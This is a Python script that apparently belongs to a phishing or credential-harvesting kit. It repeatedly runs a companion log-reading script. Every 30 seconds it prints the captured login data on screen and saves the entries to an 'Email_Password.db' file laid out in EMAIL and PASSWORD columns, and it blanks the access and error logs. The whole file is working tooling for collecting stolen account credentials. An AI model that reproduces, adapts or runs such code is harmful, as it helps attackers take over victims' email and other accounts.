#!/usr/bin/env python3

import os
import sys
import time
import subprocess
from subprocess import PIPE

Path_St = "/".join(os.path.abspath(__file__).split('/'))[:-16]
Path_DB_PASS = Path_St.split('/')
Path_DB_PASS = ("/".join(Path_DB_PASS[:-3]))

if os.path.exists(Path_St+'LOGIN_DB.txt'):
    with open (Path_St+'LOGIN_DB.txt','r')as reas_DB :
         read_data = reas_DB.readlines()
    with open(Path_DB_PASS+'/Email_Password.db','r') as read_list : 
         read_list_DB = read_list.readlines()
    with open(Path_DB_PASS+'/Email_Password.db','a') as DB_PASS :       
         write_data = (str("".join(read_data[3:])))
         if  write_data in read_list_DB :
             pass
         else:
              write_data = DB_PASS.write(str("".join(read_data[3:])))
else:     
     with open(Path_DB_PASS+'/Email_Password.db','w') as DB_PASS :        
          write_data = DB_PASS.write(" "+"-"*55+'\n'+"| "+f"{'       EMAIL    ':<25}"+" | "+f"{'         PASSWORD   ':<25} |"+"\n"+"-"*54+'\n')
with open (Path_St+'LOGIN_DB.txt','w')as reas_DB:
     with open(Path_St+'log_error.log','w') as Log_Handel :
          with open(Path_St+'log_access.log','w') as Log_Handel :
                pass
class Read_Stream_Update :
        
       def __init__(self):
           self.while_read()
       def while_read(self):
          try:
              while True :
                 remotefile = Path_St +'read_errorLOG.py > '+ Path_St+'LOGIN_DB.txt'
                 call_termminal = subprocess.call(remotefile,shell=True,stderr=subprocess.PIPE)
                 with open(Path_St+'LOGIN_DB.txt','r') as filedb :
                    db_file = filedb.read()
                    os.system('clear')
                    print('\n'+('='*20)+'\n[+] Important Note '+'\n'+('='*20)+'\n'+'[+] This File read in real Time will be Update evey 30 Seconds'\
                    +'\n'+('='*40)+'\n'+db_file)
                    time.sleep(30)
          except KeyboardInterrupt :             
                 with open (Path_St+'LOGIN_DB.txt','r')as reas_DB :
                      read_data = reas_DB.readlines()
                 with open(Path_DB_PASS+'/Email_Password.db','r') as read_list : 
                      read_list_DB = read_list.readlines()
                 with open(Path_DB_PASS+'/Email_Password.db','a') as DB_PASS :       
                      write_data = (str("".join(read_data[3:])))
                      if  write_data in read_list_DB :
                          pass
                      else:
                         write_data = DB_PASS.write(str("".join(read_data[3:])))
                 exit()
if __name__=='__main__':
   Read_Stream_Update()
      

 
